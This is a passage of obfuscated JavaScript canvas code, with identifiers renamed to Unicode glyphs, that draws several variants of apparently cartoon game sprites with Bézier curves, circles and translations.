				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 193.75, 72.84375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 206.75, ᐃ * 47.84375, 221.75 * ᐃ, 37.84375 * ᐃ, 249.75 * ᐃ, ᐃ * 35.84375);
				Δ.bezierCurveTo(ᐃ * 264.75, 34.84375 * ᐃ, 305.75 * ᐃ, ᐃ * 16.84375, ᐃ * 300.75, 24.84375 * ᐃ);
				Δ.bezierCurveTo(273.75 * ᐃ, ᐃ * 45.84375, ᐃ * 245.75, 46.84375 * ᐃ, 235.75 * ᐃ, ᐃ * 62.84375);
				Δ.bezierCurveTo(ᐃ * 218.75, 82.84375 * ᐃ, ᐃ * 215.75, 87.84375 * ᐃ, ᐃ * 199.75, ᐃ * 84.84375);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Δⵠⵠⵠ], ⵠᐃΔΔ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
				Δ.moveTo(ᐃ * 126.75, 80.34375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 94.75, 88.34375 * ᐃ, ᐃ * 83.75, 88.34375 * ᐃ, ᐃ * 65.75, ᐃ * 90.34375);
				Δ.bezierCurveTo(ᐃ * 61.75, 87.34375 * ᐃ, ᐃ * 86.75, ᐃ * 77.34375, ᐃ * 129.75, ᐃ * 70.34375);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃΔᐃⲆ], Ⲇᐃ[2], ᐃ * ⵠⵠΔᐃΔ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(120.75 * ᐃ, ᐃ * 72.34375);
				Δ.bezierCurveTo(ᐃ * 128.75, 62.34375 * ᐃ, 98.75 * ᐃ, ᐃ * 64.34375, ᐃ * 49.75, 68.34375 * ᐃ);
				Δ.bezierCurveTo(34.75 * ᐃ, 75.34375 * ᐃ, ᐃ * 101.75, ᐃ * 72.34375, 124.75 * ᐃ, ᐃ * 78.34375);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⲆΔΔⵠ], ᐃ * 4);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(128.75 * ᐃ, 76.34375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 111.75, 54.34375 * ᐃ, ᐃ * 69.75, 48.34375 * ᐃ, ᐃ * 39.75, 50.34375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 26.75, 53.34375 * ᐃ, ᐃ * 86.75, ᐃ * 59.34375, 123.75 * ᐃ, 78.34375 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃⲆᐃⲆⵠ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
				Δ.moveTo(143.75 * ᐃ, 74.34375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 128.75, ᐃ * 48.34375, ᐃ * 108.75, ᐃ * 35.34375, ᐃ * 81.75, ᐃ * 35.34375);
				Δ.bezierCurveTo(63.75 * ᐃ, ᐃ * 33.34375, 26.75 * ᐃ, ᐃ * 15.34375, ᐃ * 29.75, 25.34375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 33.75, 30.34375 * ᐃ, ᐃ * 49.75, 40.34375 * ᐃ, 70.75 * ᐃ, ᐃ * 49.34375);
				Δ.bezierCurveTo(ᐃ * 94.75, 54.34375 * ᐃ, 104.75 * ᐃ, ᐃ * 72.34375, 128.75 * ᐃ, 88.34375 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃΔᐃⲆ], Ⲇᐃ[2], ⲆΔⵠᐃ * ᐃ);
				Δ.translate(0, -28 * ᐃ);
				Δ.save();
				Δ.translate(165.25 * ᐃ, 106.84375 * ᐃ);
				Ⲇᐃᐃ(Δ, ᐃ * -56.5, -41.5 * ᐃ, 113 * ᐃ, 83 * ᐃ, ᐃ * 18);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ΔΔΔ], Ⲇᐃ[ⵠⲆⵠⲆ], ᐃ * ᐃⲆᐃⲆⵠ);
				Δ.translate(ᐃ * 28, ᐃ * 15);
				Δ.translate(0, ᐃ * 8);
				Δ.globalAlpha = .5;
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(83 * ᐃ, 52 * ᐃ);
				Δ.bezierCurveTo(78 * ᐃ, ᐃ * 65, ᐃ * 110, 72 * ᐃ, 139 * ᐃ, ᐃ * 71);
				Δ.bezierCurveTo(ᐃ * 176, 71 * ᐃ, 193 * ᐃ, 61 * ᐃ, 191 * ᐃ, ᐃ * 54);
				Δ.bezierCurveTo(ᐃ * 202, ᐃ * 58, 198 * ᐃ, ᐃ * 72, 187 * ᐃ, 75 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 143, 87 * ᐃ, ᐃ * 107, 79 * ᐃ, ᐃ * 89, ᐃ * 75);
				Δ.bezierCurveTo(ᐃ * 72, ᐃ * 69, ᐃ * 74, 58 * ᐃ, ᐃ * 83, ᐃ * 52);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ]);
				Δ.globalAlpha = 1;
				Δ.translate(ᐃ * 0, ᐃ * -ⵠⲆΔⵠᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
				Δ.moveTo(83 * ᐃ, ᐃ * 52);
				Δ.bezierCurveTo(ᐃ * 78, 65 * ᐃ, ᐃ * 110, 72 * ᐃ, ᐃ * 139, 71 * ᐃ);
				Δ.bezierCurveTo(176 * ᐃ, 71 * ᐃ, 193 * ᐃ, 61 * ᐃ, 191 * ᐃ, 54 * ᐃ);
				Δ.bezierCurveTo(202 * ᐃ, 58 * ᐃ, 198 * ᐃ, ᐃ * 72, ᐃ * 187, 75 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 143, 87 * ᐃ, 107 * ᐃ, 79 * ᐃ, 89 * ᐃ, 75 * ᐃ);
				Δ.bezierCurveTo(72 * ᐃ, 69 * ᐃ, 74 * ᐃ, ᐃ * 58, ᐃ * 83, 52 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔⲆ], Ⲇᐃ[6], ⵠΔΔᐃΔ * ᐃ);
				Δ.translate(ᐃ * -28, -15 * ᐃ);
				ⵠᐃᐃ(Δ, 141.75 * ᐃ, ᐃ * 127.34375, ᐃ * 15);
				ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠΔ]);
				ⵠᐃᐃ(Δ, ᐃ * 191.75, 127.09375 * ᐃ, 15 * ᐃ);
				ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠᐃ]);
				ⵠᐃᐃ(Δ, 138.75 * ᐃ, ᐃ * 119.34375, ᐃ * 5);
				ΔⲆ(Δ, Ⲇᐃ[4]);
				ⵠᐃᐃ(Δ, 188.75 * ᐃ, 119.34375 * ᐃ, ᐃ * ᐃΔΔΔ);
				ΔⲆ(Δ, Ⲇᐃ[ΔᐃⵠⵠⲆ]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(125.75 * ᐃ, ᐃ * 139.34375);
				Δ.bezierCurveTo(ᐃ * 134.75, 134.34375 * ᐃ, 143.75 * ᐃ, 134.34375 * ᐃ, 156.75 * ᐃ, 139.34375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 153.25, ᐃ * 141.84375, 153.25 * ᐃ, ᐃ * 141.84375, 149.75 * ᐃ, 144.34375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 140.25, ᐃ * 144.34375, ᐃ * 140.25, 144.34375 * ᐃ, 130.75 * ᐃ, ᐃ * 144.34375);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⲆⵠⲆⲆ]);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
				Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
				Δ.moveTo(176.75 * ᐃ, 139.34375 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 183.75, 135.34375 * ᐃ, 199.75 * ᐃ, ᐃ * 135.34375, ᐃ * 205.75, ᐃ * 139.34375);
				Δ.bezierCurveTo(ᐃ * 203.25, 141.34375 * ᐃ, ᐃ * 203.25, ᐃ * 141.34375, 200.75 * ᐃ, ᐃ * 143.34375);
				Δ.bezierCurveTo(190.75 * ᐃ, 143.84375 * ᐃ, 190.75 * ᐃ, ᐃ * 143.84375, ᐃ * 180.75, ᐃ * 144.34375);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1])
			} else {
				Δ.globalAlpha = .75;
				Δ.translate(ⵠⲆᐃⵠ, ᐃ * ΔᐃᐃⲆᐃ);
				Δ.save();
				Δ.translate(87 * ᐃ, ᐃ * 64.5);
				Ⲇᐃᐃ(Δ, ᐃ * -56, -41.5 * ᐃ, ᐃ * 112, 83 * ᐃ, 18 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ΔΔΔ;
				Δ.translate(ⵠⲆᐃⵠ, -8 * ᐃ);
				Δ.save();
				Δ.translate(ᐃ * 87, ᐃ * 64.5);
				Ⲇᐃᐃ(Δ, -56 * ᐃ, ᐃ * -41.5, ᐃ * 112, ᐃ * 83, 18 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[ⲆⵠⲆⲆ], Ⲇᐃ[ΔⵠᐃⲆ], ᐃ * ⲆⵠᐃⲆ);
				if (ⵠᐃ == 0) {
					Δ.translate(27 * ᐃ, 10 * ᐃ);
					ⵠᐃᐃ(Δ, 35 * ᐃ, ᐃ * 75, ᐃ * 15);
					ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠⵠ]);
					ⵠᐃᐃ(Δ, ᐃ * 85, ᐃ * 75, ᐃ * ⲆΔΔⵠⲆ);
					ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔᐃ]);
					ⵠᐃᐃ(Δ, 32 * ᐃ, 67 * ᐃ, ⲆΔⲆᐃ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[4]);
					ⵠᐃᐃ(Δ, ᐃ * 82, 67 * ᐃ, ᐃᐃⲆᐃ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ⲆⵠᐃΔ])
				} else if (1 == ⵠᐃ) {
					Δ.beginPath();
					Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
					Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
					Δ.moveTo(35 * ᐃ, 73 * ᐃ);
					Δ.bezierCurveTo(40 * ᐃ, 72 * ᐃ, ᐃ * 38, 68 * ᐃ, 35 * ᐃ, ᐃ * 67);
					Δ.bezierCurveTo(ᐃ * 25, ᐃ * 67, ᐃ * 21, 65 * ᐃ, ΔᐃᐃΔⵠ * ᐃ, 61 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 10, ᐃ * 60, ᐃ * 16, ᐃ * 64, ᐃ * 20, 67 * ᐃ);
					Δ.bezierCurveTo(ᐃ * ᐃⲆᐃᐃ, ᐃ * 70, ⲆΔⲆΔⲆ * ᐃ, ᐃ * 68.5, ᐃ * 4, ᐃ * 70);
					Δ.bezierCurveTo(2 * ᐃ, ᐃ * 71, ᐃ * ⵠᐃΔⵠᐃ, 72 * ᐃ, 13 * ᐃ, ᐃ * 73);
					Δ.bezierCurveTo(12.5 * ᐃ, 76.5 * ᐃ, ᐃ * 12.5, 76.5 * ᐃ, 12 * ᐃ, ᐃ * 80);
					Δ.bezierCurveTo(12 * ᐃ, ᐃ * 83, 15 * ᐃ, ᐃ * 80, ᐃ * ⲆᐃΔⵠΔ, ᐃ * 73);
					Δ.bezierCurveTo(26.5 * ᐃ, 73.5 * ᐃ, ᐃ * 26.5, ᐃ * 73.5, ᐃ * 35, ᐃ * 74);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[6], ᐃ * ⵠⵠΔᐃΔ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
					Δ.moveTo(134 * ᐃ, 64 * ᐃ);
					Δ.bezierCurveTo(141.5 * ᐃ, ᐃ * 64, ᐃ * 141.5, ᐃ * 64, 149 * ᐃ, 64 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 153, ᐃ * 59, ᐃ * 156, ᐃ * 56, ᐃ * 159, 56 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 161, 57 * ᐃ, 160 * ᐃ, 60 * ᐃ, 155 * ᐃ, 65 * ᐃ);
					Δ.bezierCurveTo(165 * ᐃ, ᐃ * 71, 168 * ᐃ, ᐃ * 72, ᐃ * 169, 74 * ᐃ);
					Δ.bezierCurveTo(169 * ᐃ, 76 * ᐃ, ᐃ * 159, 71 * ᐃ, ᐃ * 156, ᐃ * 72);
					Δ.bezierCurveTo(154 * ᐃ, 72 * ᐃ, ᐃ * 155, 75 * ᐃ, ᐃ * 156, 79 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 155, ᐃ * 81, ᐃ * 153, ᐃ * 78, 150 * ᐃ, 72 * ᐃ);
					Δ.bezierCurveTo(142 * ᐃ, ᐃ * 71.5, ᐃ * 142, ᐃ * 71.5, 134 * ᐃ, 71 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 130, ᐃ * 69, 131 * ᐃ, ᐃ * 65, 135 * ᐃ, 64 * ᐃ);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔΔ], Ⲇᐃ[ⵠᐃᐃΔ], 4 * ᐃ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(80 * ᐃ, ᐃ * 95);
					Δ.bezierCurveTo(ᐃ * 83, ᐃ * 88, 89 * ᐃ, 88 * ᐃ, ᐃ * 92, ᐃ * 95);
					Δ.bezierCurveTo(ᐃ * 92, 105 * ᐃ, ᐃ * 88, ᐃ * 110, ᐃ * 86, ᐃ * 110);
					Δ.bezierCurveTo(ᐃ * 83, ᐃ * 107, ᐃ * 82, ᐃ * 104, 80 * ᐃ, 96 * ᐃ);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[8], ΔΔᐃΔ * ᐃ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
					Δ.moveTo(ᐃ * 81, ᐃ * 100);
					Δ.bezierCurveTo(ᐃ * 82, ᐃ * 97, ᐃ * 83, ᐃ * 96, 85 * ᐃ, ᐃ * 96);
					Δ.bezierCurveTo(ᐃ * 82, ᐃᐃᐃⲆⲆᐃⲆ * ᐃ, 82 * ᐃ, 101 * ᐃ, 83 * ᐃ, 103 * ᐃ);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠᐃᐃΔΔ]);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(ᐃ * 83, 103 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 83, ᐃ * 102, ᐃ * 84, ᐃ * ⵠᐃᐃᐃᐃΔⵠ, ᐃ * 86, 100 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 84, ᐃ * 103, 84 * ᐃ, 105 * ᐃ, ᐃ * 84, 106 * ᐃ);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[ⲆⵠⵠⲆΔ]);
					Δ.translate(ᐃ * 27, ᐃ * 10);
					ⵠᐃᐃ(Δ, 35 * ᐃ, ᐃ * 75, 15 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔⵠ]);
					ⵠᐃᐃ(Δ, 85 * ᐃ, ᐃ * 75, 15 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[3]);
					ⵠᐃᐃ(Δ, ᐃ * 32, 67 * ᐃ, ᐃ * 5);
					ΔⲆ(Δ, Ⲇᐃ[4]);
					ⵠᐃᐃ(Δ, 82 * ᐃ, ᐃ * 67, 5 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[4])
				} else if (2 == ⵠᐃ) {
					Δ.beginPath();
					Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
					Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
					Δ.moveTo(48 * ᐃ, 22 * ᐃ);
					Δ.bezierCurveTo(85.5 * ᐃ, 22 * ᐃ, 85.5 * ᐃ, 22 * ᐃ, ᐃ * 123, ᐃ * 22);
					Δ.bezierCurveTo(ᐃ * 138, ᐃ * 23, ᐃ * 147, ᐃ * 34, ᐃ * 143, ᐃ * 62);
					Δ.bezierCurveTo(ᐃ * 142, ᐃ * 67, 144 * ᐃ, ᐃ * 70, 149 * ᐃ, 73 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 147, ᐃ * 77, ᐃ * 145, ᐃ * 77, 143 * ᐃ, ᐃ * 77);
					Δ.bezierCurveTo(141 * ᐃ, 85 * ᐃ, ᐃ * 145, ᐃ * 92, 148 * ᐃ, 97 * ᐃ);
					Δ.bezierCurveTo(142 * ᐃ, 103 * ᐃ, ᐃ * 134, 105 * ᐃ, ᐃ * 121, 106 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 85, 106 * ᐃ, 85 * ᐃ, 106 * ᐃ, 49 * ᐃ, 106 * ᐃ);
					Δ.bezierCurveTo(32 * ᐃ, 104 * ᐃ, ᐃ * 29, ᐃ * 101, ᐃ * 24, ᐃ * 95);
					Δ.bezierCurveTo(30 * ᐃ, ᐃ * 86, ᐃ * 31, ᐃ * 85, 30 * ᐃ, ᐃ * 78);
					Δ.bezierCurveTo(ᐃ * 27.5, 76 * ᐃ, 27.5 * ᐃ, 76 * ᐃ, 25 * ᐃ, ᐃ * 74);
					Δ.bezierCurveTo(31 * ᐃ, ᐃ * 68, 31 * ᐃ, ᐃ * 60, ᐃ * 30, ᐃ * 46);
					Δ.bezierCurveTo(ᐃ * 31, ᐃ * 31, ᐃ * 37, 23 * ᐃ, 47 * ᐃ, ᐃ * 22);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃ], Ⲇᐃ[2], ᐃ * ΔⲆᐃⵠᐃ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
					Δ.moveTo(30 * ᐃ, ᐃ * 44);
					Δ.bezierCurveTo(ᐃ * 66, ᐃ * 48, ᐃ * 99, 45 * ᐃ, 141 * ᐃ, 39 * ᐃ);
					ΔⲆ(Δ, ᐃⲆᐃⲆⲆ, Ⲇᐃ[3], ᐃ * ⲆᐃᐃΔ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
					Δ.moveTo(30 * ᐃ, ᐃ * 67);
					Δ.bezierCurveTo(ᐃ * 80, 44 * ᐃ, 118 * ᐃ, 43 * ᐃ, 141 * ᐃ, 60 * ᐃ);
					ΔⲆ(Δ, undefined, Ⲇᐃ[3], ᐃ * ⲆΔⵠᐃ);
					Δ.globalAlpha = .4;
					ⵠᐃᐃ(Δ, 31 * ᐃ, 44 * ᐃ, 9 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[4]);
					ⵠᐃᐃ(Δ, ᐃ * 42, ᐃ * 47, ᐃ * 9);
					ΔⲆ(Δ, Ⲇᐃ[5]);
					ⵠᐃᐃ(Δ, 70 * ᐃ, ᐃ * 42, ᐃ * 9);
					ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃΔⲆ]);
					ⵠᐃᐃ(Δ, 53 * ᐃ, ᐃ * 45, ᐃ * ⵠᐃΔⵠΔ);
					ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠⵠⵠ]);
					ⵠᐃᐃ(Δ, 103 * ᐃ, ᐃ * 40, ΔΔΔΔΔ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ΔⵠⲆᐃⲆ]);
					ⵠᐃᐃ(Δ, ᐃ * 116, ᐃ * 41, 9 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[5]);
					ⵠᐃᐃ(Δ, ᐃ * 131, ᐃ * 41, ᐃ * 9);
					ΔⲆ(Δ, Ⲇᐃ[4]);
					ⵠᐃᐃ(Δ, 39 * ᐃ, 64 * ᐃ, 9 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[7]);
					ⵠᐃᐃ(Δ, ᐃ * 51, ᐃ * 60, ᐃ * ΔΔΔᐃᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ⲆᐃⲆΔΔ]);
					ⵠᐃᐃ(Δ, 74 * ᐃ, ᐃ * 53, ᐃ * 9);
					ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃⵠᐃ]);
					ⵠᐃᐃ(Δ, 83 * ᐃ, ᐃ * 51, ⵠⵠⲆΔⵠⵠΔ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ⲆⲆᐃⵠΔ]);
					ⵠᐃᐃ(Δ, ᐃ * 95, 51 * ᐃ, ΔⵠᐃΔΔΔⵠ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ⵠᐃᐃΔ]);
					ⵠᐃᐃ(Δ, ᐃ * 107, ᐃ * 49, ᐃ * ΔΔⵠⲆⵠ);
					ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⲆⲆ]);
					ⵠᐃᐃ(Δ, ᐃ * 120, 50 * ᐃ, ᐃ * 9);
					ΔⲆ(Δ, Ⲇᐃ[4]);
					ⵠᐃᐃ(Δ, ᐃ * 137, ᐃ * 57, 9 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔΔ]);
					Δ.globalAlpha = ᐃⲆᐃ;
					ⵠᐃᐃ(Δ, ᐃ * 31, 44 * ᐃ, ΔⲆⲆⲆ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[4]);
					ⵠᐃᐃ(Δ, 42 * ᐃ, 47 * ᐃ, ᐃ * ᐃⲆᐃⲆⵠ);
					ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⲆ]);
					ⵠᐃᐃ(Δ, ᐃ * 53, ᐃ * 45, ᐃ * ΔⲆᐃⵠᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⵠᐃᐃ]);
					ⵠᐃᐃ(Δ, 70 * ᐃ, 43 * ᐃ, ⲆⵠΔⵠ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[6]);
					ⵠᐃᐃ(Δ, ᐃ * 50, 59 * ᐃ, 4 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆᐃ]);
					ⵠᐃᐃ(Δ, ᐃ * 39, ᐃ * 64, ⲆⵠᐃⲆ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠⵠⵠ]);
					ⵠᐃᐃ(Δ, ᐃ * 83, ᐃ * 51, ᐃ * 4);
					ΔⲆ(Δ, Ⲇᐃ[4]);
					ⵠᐃᐃ(Δ, ᐃ * 74, 53 * ᐃ, ᐃ * ΔᐃⵠⵠⲆ);
					ΔⲆ(Δ, Ⲇᐃ[8]);
					ⵠᐃᐃ(Δ, ᐃ * 95, ᐃ * 51, 4 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ⵠᐃᐃΔΔ]);
					ⵠᐃᐃ(Δ, 103 * ᐃ, 41 * ᐃ, ⲆᐃᐃΔ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[8]);
					ⵠᐃᐃ(Δ, ᐃ * 107, ᐃ * 49, ᐃ * ⲆⵠᐃⲆ);
					ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⵠᐃᐃ]);
					ⵠᐃᐃ(Δ, ᐃ * 116, ᐃ * 41, ᐃ * 4);
					ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆᐃ]);
					ⵠᐃᐃ(Δ, 131 * ᐃ, 41 * ᐃ, Ⲇⵠⵠⵠ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[4]);
					ⵠᐃᐃ(Δ, 137 * ᐃ, ᐃ * 57, ⲆⵠᐃΔ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔⲆ]);
					ⵠᐃᐃ(Δ, ᐃ * 120, 50 * ᐃ, ΔᐃⵠⵠⲆ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃⲆⵠ]);
					Δ.translate(ᐃ * 27, ᐃ * 10);
					ⵠᐃᐃ(Δ, ᐃ * 35, 75 * ᐃ, ⵠⵠⵠᐃΔⲆⵠ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[9]);
					ⵠᐃᐃ(Δ, ᐃ * 85, 75 * ᐃ, ⲆΔΔⵠⲆ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔⵠⵠ]);
					ⵠᐃᐃ(Δ, 32 * ᐃ, 67 * ᐃ, ΔⵠⲆⲆ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆⲆ]);
					ⵠᐃᐃ(Δ, 82 * ᐃ, ᐃ * 67, ᐃ * ⲆΔⲆᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⲆⲆΔ])
				} else if (Δⵠᐃⵠ == ⵠᐃ) {
					Δ.beginPath();
					Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
					Δ.lineJoin = ⵠ[ΔⲆΔΔ];
					Δ.moveTo(23 * ᐃ, 95 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 30, ᐃ * 85, 30 * ᐃ, ᐃ * 83, 30 * ᐃ, 72 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 30, 61.5 * ᐃ, ᐃ * 30, ᐃ * 61.5, 30 * ᐃ, ᐃ * 51);
					Δ.bezierCurveTo(29 * ᐃ, 33 * ᐃ, ᐃ * 42, 23 * ᐃ, ᐃ * 54, 24 * ᐃ);
					Δ.bezierCurveTo(86.5 * ᐃ, ᐃ * 24, 86.5 * ᐃ, ᐃ * 24, 119 * ᐃ, ᐃ * 24);
					Δ.bezierCurveTo(135 * ᐃ, 24 * ᐃ, ᐃ * 143, ᐃ * 33, ᐃ * 143, ᐃ * 47);
					Δ.bezierCurveTo(143 * ᐃ, ᐃ * 63.5, 143 * ᐃ, ᐃ * 63.5, 143 * ᐃ, ᐃ * 80);
					Δ.bezierCurveTo(142 * ᐃ, ᐃ * 86, ᐃ * 147, 93 * ᐃ, ᐃ * 150, ᐃ * 96);
					Δ.bezierCurveTo(ᐃ * 144, ᐃ * 107, ᐃ * 113, ᐃ * 112, ᐃ * 84, 111 * ᐃ);
					Δ.bezierCurveTo(52 * ᐃ, 112 * ᐃ, ᐃ * 34, ᐃ * 106, 23 * ᐃ, 96 * ᐃ);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⲆᐃᐃⲆ], ⲆᐃᐃΔ * ᐃ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(30 * ᐃ, ᐃ * 81);
					Δ.bezierCurveTo(56 * ᐃ, ᐃ * 99, ᐃ * 104, ᐃ * 98, ᐃ * 142, ᐃ * 84);
					Δ.bezierCurveTo(145.5 * ᐃ, ᐃ * 89.5, ᐃ * 145.5, ᐃ * 89.5, 149 * ᐃ, 95 * ᐃ);
					Δ.bezierCurveTo(142 * ᐃ, 106 * ᐃ, ᐃ * 127, 110 * ᐃ, ᐃ * 81, 110 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 36, 112 * ᐃ, ᐃ * 28, ᐃ * 99, 23 * ᐃ, ᐃ * 95);
					Δ.bezierCurveTo(ᐃ * 31, ᐃ * 87, 31 * ᐃ, 82 * ᐃ, 30 * ᐃ, ᐃ * 81);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[2], ᐃ * Ⲇⵠⵠⵠ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(ᐃ * 23, ᐃ * 95);
					Δ.bezierCurveTo(30 * ᐃ, 85 * ᐃ, ᐃ * 30, ᐃ * 83, 30 * ᐃ, ᐃ * 72);
					Δ.bezierCurveTo(30 * ᐃ, 61.5 * ᐃ, 30 * ᐃ, ᐃ * 61.5, 30 * ᐃ, 51 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 29, ᐃ * 33, 42 * ᐃ, ᐃ * 23, ᐃ * 54, 24 * ᐃ);
					Δ.bezierCurveTo(86.5 * ᐃ, ᐃ * 24, 86.5 * ᐃ, 24 * ᐃ, 119 * ᐃ, 24 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 135, 24 * ᐃ, ᐃ * 143, ᐃ * 33, 143 * ᐃ, ᐃ * 47);
					Δ.bezierCurveTo(ᐃ * 143, ᐃ * 63.5, 143 * ᐃ, ᐃ * 63.5, ᐃ * 143, 80 * ᐃ);
